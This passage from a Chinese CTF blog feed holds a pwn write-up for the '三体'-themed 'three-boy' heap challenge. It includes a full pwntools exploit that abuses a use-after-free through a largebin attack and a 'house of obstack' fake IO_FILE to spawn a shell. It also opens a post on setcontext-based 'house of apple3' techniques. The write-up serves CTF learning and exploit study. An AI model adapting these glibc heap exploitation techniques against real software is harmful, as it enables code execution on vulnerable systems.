title="three-boy"></a>three-boy</h2><p>检查保护。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711210008159.png" alt="image-20230711210008159"></p><p>保护全开。</p><p>这道题仍然是一道常规的堆菜单题。</p><p><code>sub_17C1</code>函数根据随机数分配堆块。这里为了使我们分配的堆块可控，笔者使用python模拟rand随机数。<img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711210238126.png" alt="image-20230711210238126"></p><p><code>sub_16AA</code>函数存在<strong>UAF</strong>漏洞。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711205905435.png" alt="image-20230711205905435"></p><p>还可以edit堆块一次以及show堆块一次。</p><p>大致思路就是泄露heap以及libc地址，分配比较大的chunk，然后剩下的堆块从这个大的chunk中分割，即可利用一次edit进行largebin attack以及伪造IO file。</p><p>笔者这里采用house of obstack的方式获取shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.35.so&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myadd</span>(<span class="hljs-params">index, size, select</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;area to explore: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;explore this time: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;(1: yes / 0: no)&#x27;</span>, <span class="hljs-built_in">str</span>(select))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    flag = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> flag:<br>        <span class="hljs-keyword">if</span> fun.rand() % <span class="hljs-number">10</span> &gt; <span class="hljs-number">4</span>:<br>            myadd(index, size, <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">else</span>:<br>            flag = <span class="hljs-number">0</span><br>            myadd(index, size, <span class="hljs-number">0</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;signal from the Trisolarans: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, size, content</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;area to talk to: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;words you want to send: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;write down your conclusions: &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;abandon to return: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">house_of_obstack</span>(<span class="hljs-params">fake_IO_file_addr</span>):<br>    fake_IO_file = flat(<br>        &#123;<br>            <span class="hljs-number">0x8</span>: <span class="hljs-number">1</span>,<span class="hljs-comment"># next_free</span><br>            <span class="hljs-number">0x10</span>: <span class="hljs-number">0</span>,<span class="hljs-comment"># chunk_limit</span><br>            <span class="hljs-number">0x18</span>: <span class="hljs-number">1</span>,<span class="hljs-comment"># _IO_write_ptr</span><br>            <span class="hljs-number">0x20</span>: <span class="hljs-number">0</span>,<span class="hljs-comment"># _IO_write_end</span><br>            <span class="hljs-number">0x28</span>: system,<span class="hljs-comment"># gadget</span><br>            <span class="hljs-number">0x38</span>: fake_IO_file_addr + <span class="hljs-number">0xe8</span>,<span class="hljs-comment"># rdi = &amp;&#x27;/bin/sh\x00&#x27;</span><br>            <span class="hljs-number">0x40</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-number">0x58</span>: <span class="hljs-number">0</span>,<span class="hljs-comment"># chain</span><br>            <span class="hljs-number">0x78</span>: _IO_stdfile_2_lock,<span class="hljs-comment"># _IO_stdfile_1_lock</span><br>            <span class="hljs-number">0x90</span>: _IO_wide_data,<span class="hljs-comment"># _IO_wide_data_2</span><br>            <span class="hljs-number">0xc8</span>: _IO_obstack_jumps + <span class="hljs-number">0x20</span>,<br>            <span class="hljs-number">0xd0</span>: fake_IO_file_addr,    <span class="hljs-comment"># obstack(B)</span><br>            <span class="hljs-number">0xd8</span>: <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>        &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>    )<br>    payload = fake_IO_file<br>    <br>    <span class="hljs-keyword">return</span> payload<br>    <br><br>fun = cdll.LoadLibrary(<span class="hljs-string">&#x27;./libc-2.35.so&#x27;</span>)<br>fun.srand(((fun.time(<span class="hljs-number">0</span>) &amp; <span class="hljs-number">0xffffffff</span>) // <span class="hljs-number">100</span>) * <span class="hljs-number">100</span>)<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x520</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x500</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">2</span>)<br><br>show(<span class="hljs-number">0</span>)<br><br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x219ce0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>p.recv(<span class="hljs-number">2</span>)<br><br>heapbase = u64(p.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0xcb0</span><br>lg(<span class="hljs-string">&#x27;heapbase&#x27;</span>, heapbase)<br><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>_IO_list_all = libc_base + <span class="hljs-number">0x21a680</span><br>_IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x21ba80</span><br>_IO_wide_jumps = libc_base + <span class="hljs-number">0x2160c0</span><br>_IO_obstack_jumps = libc_base + <span class="hljs-number">0x2163c0</span><br>_IO_wide_data = libc_base + <span class="hljs-number">0x219b80</span><br><br>gadgets = [<span class="hljs-number">0x50a37</span>, <span class="hljs-number">0xebcf1</span>, <span class="hljs-number">0xebcf5</span>, <span class="hljs-number">0xebcf8</span>]<br>one_gadget = libc_base + gadgets[<span class="hljs-number">0</span>]<br><br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x520</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x500</span>)<br><br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x1000</span>)<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x500</span>)<br><br>delete(<span class="hljs-number">6</span>)<br><br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x540</span>)<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x540</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x560</span>)<br><br>delete(<span class="hljs-number">10</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x1000</span>)<br><br>payload = flat(&#123;<br>    <span class="hljs-number">0</span>: house_of_obstack(heapbase + <span class="hljs-number">0x16f0</span>), <br>    <span class="hljs-number">0x540</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0x551</span>],<br>    <span class="hljs-number">0xa90</span>: [<br>        <span class="hljs-number">0</span>, <span class="hljs-number">0x571</span>,<br>        libc_base + <span class="hljs-number">0x21a120</span>, libc_base + <span class="hljs-number">0x21a120</span>, <br>        heapbase + <span class="hljs-number">0x2190</span>, _IO_list_all - <span class="hljs-number">0x20</span><br>    ]<br>&#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><br>edit(<span class="hljs-number">6</span>, <span class="hljs-built_in">len</span>(payload), payload)<br><br>delete(<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">12</span>, <span class="hljs-number">0x1000</span>)<br><br><span class="hljs-comment"># dbg()</span><br><br>menu(<span class="hljs-number">5</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711210754278.png" alt="image-20230711210754278"></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>house of apple + house of 一骑绝尘</title>
    <link href="/2023/02/16/house-of-apple-house-of-%E4%B8%80%E9%AA%91%E7%BB%9D%E5%B0%98/"/>
    <url>/2023/02/16/house-of-apple-house-of-%E4%B8%80%E9%AA%91%E7%BB%9D%E5%B0%98/</url>
    
    <content type="html"><![CDATA[<h1 id="house-of-apple3-house-of-一骑当千"><a href="#house-of-apple3-house-of-一骑当千" class="headerlink" title="house of apple3 + house of 一骑当千"></a>house of apple3 + house of 一骑当千</h1><blockquote><p>libc2.36之后，去除了我们常用的magic gadget，以至于我们无法通过house of apple控制rdx，从而实现ORW。但是house of 一骑绝尘为我们提供了一个新的思路 。伪造ucontext_t结构体，通过执行setcontext控制rdx。</p></blockquote><h2 id="house-of-apple3"><a href="#house-of-apple3" class="headerlink" title="house of apple3"></a>house of apple3</h2><p>基于<strong>IO_FILE-&gt;_codecvt</strong>的利用方法。详细请参考<a href="https://bbs.kanxue.com/user-home-956675.htm">roderick01</a>师傅的博客。</p><h2 id="house-of-一骑当千"><a href="#house-of-一骑当千" class="headerlink" title="house of 一骑当千"></a>house of 一骑当千</h2><h3 id="key-struct"><a href="#key-struct" class="headerlink" title="key struct"></a>key struct</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Container for all general registers.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">greg_t</span> <span class="hljs-type">gregset_t</span>[__NGREG];<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __USE_GNU</span><br><span class="hljs-comment">/* Number of each register in the `gregset_t&#x27; array.  */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span></span><br><span class="hljs-class">&#123;</span><br>  REG_R8 = <span class="hljs-number">0</span>,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_R8REG_R8</span><br>  REG_R9,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_R9REG_R9</span><br>  REG_R10,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_R10REG_R10</span><br>  REG_R11,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_R11REG_R11</span><br>  REG_R12,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_R12REG_R12</span><br>  REG_R13,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_R13REG_R13</span><br>  REG_R14,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_R14REG_R14</span><br>  REG_R15,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_R15REG_R15</span><br>  REG_RDI,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_RDIREG_RDI</span><br>  REG_RSI,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_RSIREG_RSI</span><br>  REG_RBP,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_RBPREG_RBP</span><br>  REG_RBX,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_RBXREG_RBX</span><br>  REG_RDX,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_RDXREG_RDX</span><br>  REG_RAX,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_RAXREG_RAX</span><br>  REG_RCX,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_RCXREG_RCX</span><br>  REG_RSP,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_RSPREG_RSP</span><br>  REG_RIP,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_RIPREG_RIP</span><br>  REG_EFL,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_EFLREG_EFL</span><br>  REG_CSGSFS,<span class="hljs-comment">/* Actually short cs, gs, fs, __pad0.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_CSGSFSREG_CSGSFS</span><br>  REG_ERR,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_ERRREG_ERR</span><br>  REG_TRAPNO,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_TRAPNOREG_TRAPNO</span><br>  REG_OLDMASK,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_OLDMASKREG_OLDMASK</span><br>  REG_CR2<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_CR2REG_CR2</span><br>&#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">libc_fpxreg</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> __ctx(significand)[<span class="hljs-number">4</span>];<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> __ctx(exponent);<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> __glibc_reserved1[<span class="hljs-number">3</span>];<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">libc_xmmreg</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">__uint32_t</span>__ctx(element)[<span class="hljs-number">4</span>];<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">libc_fpstate</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* 64-bit FXSAVE format.  */</span><br>  <span class="hljs-type">__uint16_t</span>__ctx(cwd);<br>  <span class="hljs-type">__uint16_t</span>__ctx(swd);<br>  <span class="hljs-type">__uint16_t</span>__ctx(ftw);<br>  <span class="hljs-type">__uint16_t</span>__ctx(fop);<br>  <span class="hljs-type">__uint64_t</span>__ctx(rip);<br>  <span class="hljs-type">__uint64_t</span>__ctx(rdp);<br>  <span class="hljs-type">__uint32_t</span>__ctx(mxcsr);<span class="hljs-comment">// 0x1c0</span><br>  <span class="hljs-type">__uint32_t</span>__ctx(mxcr_mask);<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">libc_fpxreg</span>_<span class="hljs-title">st</span>[8];</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">libc_xmmreg</span>_<span class="hljs-title">xmm</span>[16];</span><br>  <span class="hljs-type">__uint32_t</span>__glibc_reserved1[<span class="hljs-number">24</span>];<br>&#125;;<br><span class="hljs-comment">/* Structure to describe FPU registers.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">libc_fpstate</span> *<span class="hljs-title">fpregset_t</span>;</span><br><br><span class="hljs-comment">/* Context to describe whole processor state.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-type">gregset_t</span> __ctx(gregs);<span class="hljs-comment">// size = 0xb8</span><br>    <span class="hljs-comment">/* Note that fpregs is a pointer.  */</span><br>    <span class="hljs-type">fpregset_t</span> __ctx(fpregs);<span class="hljs-comment">// 0x8</span><br>    __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> __reserved1 [<span class="hljs-number">8</span>];<span class="hljs-comment">// 0x40</span><br>&#125; <span class="hljs-type">mcontext_t</span>;<span class="hljs-comment">// size = 0x100</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stack_t</span> &#123;</span><br>    <span class="hljs-type">void</span> *ss_sp;<br>    <span class="hljs-type">int</span> ss_flags;<br>    <span class="hljs-type">size_t</span> ss_size;<br>&#125;<br><br><span class="hljs-comment">/* Userlevel context.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucontext_t</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> __ctx(uc_flags);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucontext_t</span> *<span class="hljs-title">uc_link</span>;</span><br>    <span class="hljs-type">stack_t</span> uc_stack;<span class="hljs-comment">// size = 0x18</span><br>    <span class="hljs-type">mcontext_t</span> uc_mcontext;<span class="hljs-comment">// size = 0x100, offset = 0x28</span><br>    <span class="hljs-type">sigset_t</span> uc_sigmask;<span class="hljs-comment">// size = 0x80, offset = 0x128</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">libc_fpstate</span> __<span class="hljs-title">fpregs_mem</span>;</span><span class="hljs-comment">// size = 0x200, offset = 0x1a8</span><br>    __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> __ssp[<span class="hljs-number">4</span>];<br>  &#125; <span class="hljs-type">ucontext_t</span>;<span class="hljs-comment">// size = 0x3c8</span><br><br></code></pre></td></tr></table></figure><h3 id="setcontext-x86"><a href="#setcontext-x86" class="headerlink" title="setcontext(x86)"></a><strong>setcontext(x86)</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs assembly">&lt;+0&gt;:endbr64 <br>&lt;+4&gt;:push   rdi<br>&lt;+5&gt;:lea    rsi,[rdi+0x128]<br>&lt;+12&gt;:xor    edx,edx<br>&lt;+14&gt;:mov    edi,0x2<br>&lt;+19&gt;:mov    r10d,0x8<br>&lt;+25&gt;:mov    eax,0xe<br>&lt;+30&gt;:syscall <br>&lt;+32&gt;:pop    rdx# key<br>&lt;+33&gt;:cmp    rax,0xfffffffffffff001<br>&lt;+39&gt;:jae    &lt;setcontext+335&gt;<br>&lt;+45&gt;:mov    rcx,QWORD PTR [rdx+0xe0]<br>&lt;+52&gt;:fldenv [rcx]# 加载浮点环境，可写<br>&lt;+54&gt;:ldmxcsr DWORD PTR [rdx+0x1c0]# 加载mxcsr寄存器，全为0即可<br>&lt;+61&gt;:mov    rsp,QWORD PTR [rdx+0xa0]<br>&lt;+68&gt;:mov    rbx,QWORD PTR [rdx+0x80]<br>&lt;+75&gt;:mov    rbp,QWORD PTR [rdx+0x78]<br>&lt;+79&gt;:mov    r12,QWORD PTR [rdx+0x48]<br>&lt;+83&gt;:mov    r13,QWORD PTR [rdx+0x50]<br>&lt;+87&gt;:mov    r14,QWORD PTR [rdx+0x58]<br>&lt;+91&gt;:mov    r15,QWORD PTR [rdx+0x60]<br>&lt;+95&gt;:test   DWORD PTR fs:0x48,0x2<br>&lt;+107&gt;:je     &lt;setcontext+294&gt;<br># ......<br>&lt;+294&gt;:mov    rcx,QWORD PTR [rdx+0xa8]<br>&lt;+301&gt;:push   rcx<br>&lt;+302&gt;:mov    rsi,QWORD PTR [rdx+0x70]<br>&lt;+306&gt;:mov    rdi,QWORD PTR [rdx+0x68]<br>&lt;+310&gt;:mov    rcx,QWORD PTR [rdx+0x98]<br>&lt;+317&gt;:mov    r8,QWORD PTR [rdx+0x28]<br>&lt;+321&gt;:mov    r9,QWORD PTR [rdx+0x30]<br>&lt;+325&gt;:mov    rdx,QWORD PTR [rdx+0x88]<br>&lt;+332&gt;:xor    eax,eax<br>&lt;+334&gt;:ret    <br>&lt;+335&gt;:mov    rcx,QWORD PTR [rip+0x1c528a]<br>&lt;+342&gt;:neg    eax<br>&lt;+344&gt;:mov    DWORD PTR fs:[rcx],eax<br>&lt;+347&gt;:or     rax,0xffffffffffffffff<br>&lt;+351&gt;:ret <br></code></pre></td></tr></table></figure><p>阅读<code>setcontext</code>源代码可知，我们之前利用是从<code>setcontext + 61</code>开始，所以我们需要想办法控制<strong>rdx</strong>。但是我们可以看到，该函数一开始就将<strong>rdi</strong>压栈，并且出栈给<strong>rdx</strong>，所以我们只要控制<strong>rdi</strong>，即<code>setcontext</code>第一个参数，并且绕过一些判断，就可以实现rdi控制rdx，进行ORW的目的。</p><h2 id="模板（orw）"><a href="#模板（orw）" class="headerlink" title="模板（orw）"></a>模板（orw）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 